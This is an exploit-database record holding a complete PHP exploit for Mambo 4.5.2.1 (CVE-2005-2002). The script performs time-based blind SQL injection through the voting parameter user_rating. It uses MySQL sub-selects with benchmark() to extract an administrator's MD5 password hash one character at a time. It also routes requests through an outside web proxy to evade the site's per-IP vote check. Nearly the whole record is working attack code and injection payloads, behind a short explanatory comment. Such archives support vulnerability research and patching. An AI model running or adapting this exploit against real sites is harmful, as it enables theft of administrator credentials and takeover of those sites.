{
  "id": "1049",
  "title": "Mambo 4.5.2.1 - Fetch Password Hash",
  "cve": "CVE-2005-2002",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/php -q\r\nMambo 4.5.2.1 + mysql 4.1 > fetch password hash by pokleyzz <pokleyzz at scan-associates.net>\r\n\r\n<?php\r\n/*\r\nMambo 4.5.2.1 + mysql 4.1 > fetch password hash by pokleyzz <pokleyzz at scan-associates.net>\r\n*content rating using sub query to select from mos_users\r\n\r\nRequirement:\r\n\r\n\tPHP 4.x with curl extension\r\n\r\nDescription:\r\n\r\nThe problem occur because $user_rating variable is not properly sanitize when for use in SQL query\r\nfor UPDATE statement. \r\n\r\n>From content.php (components\\com_content\\content.php)\r\n-----\r\nfunction recordVote ( $url, $user_rating, $cid, $database ){\r\n\t$cid = intval( $cid );\r\n  \r\n\tif ( ( $user_rating >= 1 ) and ( $user_rating <= 5 ) ) { <--- 1st Checkpoint\r\n\t\t$currip = getenv( 'REMOTE_ADDR' );\r\n\r\n\t\t$query = \"SELECT * FROM #__content_rating WHERE content_id = $cid\";\r\n\t\t$database->setQuery( $query );\r\n\t\t$votesdb = NULL;\r\n\t\t\r\n\t\tif ( !( $database->loadObject( $votesdb ) ) ) {\r\n\t\t\t$query = \"INSERT INTO #__content_rating ( content_id, lastip, rating_sum, rating_count )\"\r\n\t\t\t. \"\\n VALUES ( '$cid', '$currip', '$user_rating', '1' )\";\r\n\t\t\t$database->setQuery( $query );\r\n\t\t\t$database->query() or die( $database->stderr() );;\r\n\t\t} else {\r\n\t\t\tif ($currip <> ($votesdb->lastip)) { <-- 2nd Checkpoint\r\n\t\t\t\t\r\n\t\t\t\t$query = \"UPDATE #__content_rating\"\r\n\t\t\t\t. \"\\n SET rating_count = rating_count + 1,\"\r\n\t\t\t\t. \"\\n rating_sum = rating_sum + $user_rating,\" <--- PROBLEM\r\n\t\t\t\t. \"\\n lastip = '$currip'\"\r\n\t\t\t\t. \"\\n WHERE content_id = \". $cid\r\n\t\t\t\t;\r\n\t\t\t\t$database->setQuery( $query );\r\n\t\t\t\t$database->query() or die( $database->stderr() );\r\n\t\t\t} else {\r\n\t\t\t\tmosRedirect ( $url, _ALREADY_VOTE );\r\n\t\t\t}\r\n\t\t}\r\n\t\tmosRedirect ( $url, _THANKS );\r\n\t}\r\n}\r\n-----\r\nUser may escape 1st checkpoint by passing (1-5)(string) value to $user_rating .In PHP beginning\r\nnumber in string will be use when comparing number with string.\r\n\r\nThe 2nd checkpoint will check previous user's ip rated the content. Update statement will only \r\nexecute when previous ip is different from current ip. This proof of concept will use cgi proxy from \r\nhttp://projectbypass.com to make it possible.\r\n\r\nIn mySQL 4.1 and above it is possible to use \"sub select\" in any SQL statement. We will using \r\n\"blind fishing\" with sub select to fetch password hash (md5) for supplied user id. \r\n\r\nExploiting step:\r\n\r\n1) rate from different ip\r\n2) check time for standard page loading\r\n3) check time for page loading when benchmark executed.\r\n\t\t* If error occur mysql version is < 4.1 (no support for sub select)\r\n4) double the benchmark value. Blind fishing will use this value to do the query.\r\n5) blind fishing with sub select.\r\n\r\nSpecial thanks:\r\n\r\nal3ndaleeb at hotmail.com\r\n\r\n*/\r\n\r\nif (!(function_exists('curl_init'))) {\r\n\techo \"cURL extension required\\n\";\r\n\texit;\r\n}\r\n\r\nini_set(\"max_execution_time\",\"999999\");\r\n \r\n$benchcount = 150000;\r\n$aid= 62;\r\n$cid = 2;\r\n$charmap = array (48,49,50,51,52,53,54,55,56,57,\r\n\t\t  97,98,99,100,101,102,\r\n\t\t  103,104,105,\r\n\t\t  106,107,108,109,110,111,112,113,\r\n\t\t  114,115,116,117,118,119,120,121,122\r\n\t\t  );\r\n\t\t  \r\nif($argv[1]){\t\r\n\t$url = $argv[1];\r\n\tif ($argv[2])\r\n\t\t$aid = $argv[2];\r\n\tif ($argv[3])\r\n\t\t$benchcount = $argv[3];\r\n\tif ($argv[4])\r\n\t\t$proxy = $argv[4]; \r\n}\r\nelse {\r\n\techo \"Usage: \".$argv[0].\" <URL> [userid] [benchmarkcount] [proxy]\\n\\n\";\r\n\techo \"\\tURL\\t URL to mambo site (ex: http://127.0.0.1)\\n\";\r\n\techo \"\\taid\\t userid to get  (default: 62 (admin))\\n\";\r\n\techo \"\\tbenchmarkcount\\t benchmark count  (default: 150000)\\n\";\r\n\techo \"\\tproxy\\t optional proxy url  (ex: http://10.10.10.10:8080)\\n\"; \r\n\texit;\r\n}\r\n\r\n\r\n\r\n// rate from different ip (using http://projectbypass.com)\r\n\r\n$projectbypass = \"http://projectbypass.com/nph-proxy3.cgi/010110A/\";\r\n$ch = curl_init();\r\ncurl_setopt($ch, CURLOPT_URL,$projectbypass.str_replace(\"://\",\"/\",$url).\"/index.php?option=com_content&task=vote&id=1&Itemid=1&cid=$cid&user_rating=1\");\r\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER,1);\r\n$res = curl_exec($ch);\r\ncurl_close ($ch);\r\n\r\n// standard page loading time\r\n$start = time();\r\n$ch = curl_init();\r\nif ($proxy){\r\n\tcurl_setopt($ch, CURLOPT_PROXY,$proxy); \r\n}\r\ncurl_setopt($ch, CURLOPT_URL,$url);\r\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER,1);\r\n$res  = curl_exec($ch);\r\ncurl_close ($ch);\r\n$stop = time();\r\n$sloadtime = floatval($stop - $start);\r\necho \"standard page loading =\".$sloadtime.\"\\n\"; \r\n\r\n// benchmark page loading time\r\n$start = time();\r\n$ch = curl_init();\r\nif ($proxy){\r\n\tcurl_setopt($ch, CURLOPT_PROXY,$proxy); \r\n}\r\ncurl_setopt($ch, CURLOPT_URL,$url.\"/index.php?option=com_content&task=vote&id=1&Itemid=1&cid=$cid&user_rating=1,rating_sum=(select+1+from+mos_users+where+if(2>1,benchmark($benchcount,md5(1)),1))+where+content_id=$cid/*\");\r\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER,1);\r\n$res = curl_exec($ch);\r\ncurl_close ($ch);\r\n$stop = time();\r\n$bloadtime = floatval($stop - $start);\r\necho \"bencmark page loading =\".$bloadtime.\"\\n\"; \r\n\r\n// check if SQL query failed\r\nif (ereg(\"DB function failed\",$res)){\r\n\techo \"[x] mysql < 4.1 detected - not exploitable\\n\";\r\n\texit();\r\n}\r\n\r\nif ($bloadtime <= $sloadtime + 2){\r\n\techo \"[x] increase your benchmark count\\n\";\r\n\texit();\r\n}\r\n\r\necho \"Take your time for Teh Tarik... please wait ...\\n\\n\";\r\necho \"Result:\\n\";\r\necho \"\\tUserid = $aid\\n\";\r\necho \"\\tPassword Hash = \";\r\n\r\n// starting fetch password\r\n\r\n$benchcount = $benchcount*2;\r\n\t\t\r\nfor($i= 1;$i< 33;$i++){ \r\n\tforeach ($charmap as $char){\r\n\t\t$start = time();\r\n\t\techo chr($char);\r\n\t\t$ch = curl_init();\r\n\t\tif ($proxy){\r\n\t\t\tcurl_setopt($ch, CURLOPT_PROXY,$proxy); \r\n\t\t}\r\n\t\tcurl_setopt($ch, CURLOPT_URL,$url.\"/index.php?option=com_content&task=vote&id=1&Itemid=1&cid=$cid&user_rating=1,rating_sum=(select+password+from+mos_users+where+id=$aid+and+if(ascii(substring(password,$i,1))=$char,benchmark($benchcount,md5(1)),1))+where+content_id=$cid/*\");\r\n\t\tcurl_setopt($ch, CURLOPT_RETURNTRANSFER,1);\r\n\t\t$res=curl_exec ($ch);\r\n\t\tcurl_close ($ch);\r\n\t\t$stop = time();\r\n\t\t$xloadtime = floatval($stop - $start);\r\n\t\tif (floatval($xloadtime) > $bloadtime){\r\n\t\t\t$hash .= chr($char);\r\n\t\t\tbreak 1;\r\n\t\t}\r\n\t\telse {\r\n\t\t\techo chr(8);\r\n\t\t}\r\n\t\t\r\n\t\tif ($char == 103){\r\n\t\t\techo \"\\n\\n\\tNot Vulnerable or Something wrong occur ...\\n\";\r\n\t\t\texit;\r\n\t\t}\r\n\t\t\r\n\t}\r\n}\r\necho \"\\n\";\r\n\r\n?>\r\n\r\n// milw0rm.com [2005-06-15]",
  "url": "https://www.exploit-db.com/exploits/1049"
}